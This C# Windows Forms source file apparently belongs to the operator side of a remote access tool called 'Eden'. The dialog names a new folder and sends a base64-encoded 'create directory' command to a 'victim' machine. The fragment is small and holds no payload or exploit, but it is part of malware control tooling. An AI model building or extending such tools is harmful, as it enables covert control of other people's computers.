using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileAddDir : Form
    {
        public clsClient m_clnt;
        public string m_szVictimID;

        public frmFileAddDir(clsClient clnt, string szVictimID)
        {
            InitializeComponent();

            m_clnt = clnt;
            m_szVictimID = szVictimID;
        }

        void setup()
        {
            textBox1.Text = "NewFolder_" + clsTools.GetFileNameFromDatetime();
        }

        private void frmFileAddDir_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            m_clnt.SendVictim(m_szVictimID, "File|new|d|" + EZCrypto.Encoder.stre2b64(textBox1.Text));
        }
    }
}
